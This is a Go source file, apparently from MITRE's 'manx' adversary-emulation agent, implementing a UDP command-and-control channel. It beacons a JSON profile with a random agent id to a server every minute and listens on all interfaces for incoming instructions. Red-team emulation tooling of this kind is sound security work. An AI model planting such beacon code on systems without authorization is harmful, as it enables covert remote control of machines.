package sockets

import (
	"fmt"
	"net"
	"time"
	"math/rand"
	"encoding/json"
	
	"github.com/mitre/manx/shells/output"
)

//UDP communication
type UDP struct { }

func init() {
	CommunicationChannels["udp"] = UDP{}
}

//Listen through a new socket connection
func (contact UDP) Listen(port string, server string, inbound int, profile map[string]interface{}) {
	profile["paw"]= buildPaw()
	profile["callback"] = inbound
	profile["tag"] = "beacon"
	go callMeBack(inbound)

	for {
	   conn, err := net.Dial("udp", port)
	   if err == nil {
			beacon(conn, profile)

			if err = conn.Close(); err != nil {
				output.VerbosePrint(fmt.Sprintf("[-] %s", err))
			}
		} else {
			output.VerbosePrint(fmt.Sprintf("[-] %s", err))
		}

		time.Sleep(60 * time.Second)
	}
}

func callMeBack(port int) {
	p := make([]byte, 2048)
    addr := net.UDPAddr{
        Port: port,
        IP: net.ParseIP("0.0.0.0"),
    }
    ser, err := net.ListenUDP("udp", &addr)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[-] %v\n", err))
        return
    }
    for {
        _,remoteaddr,err := ser.ReadFromUDP(p)
		output.VerbosePrint(fmt.Sprintf("[+] Instruction received (%v) %s", remoteaddr, p))
        if err !=  nil {
            output.VerbosePrint(fmt.Sprintf("[-] %v", err))
            continue
        }
    }
}

func buildPaw() string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprintf("%d", rand.Intn(999999 - 1))
}

func beacon(conn net.Conn, profile map[string]interface{}) {
	output.VerbosePrint("[*] Sending beacon")
	jdata, _ := json.Marshal(profile)
	fmt.Fprintf(conn, string(jdata))
}
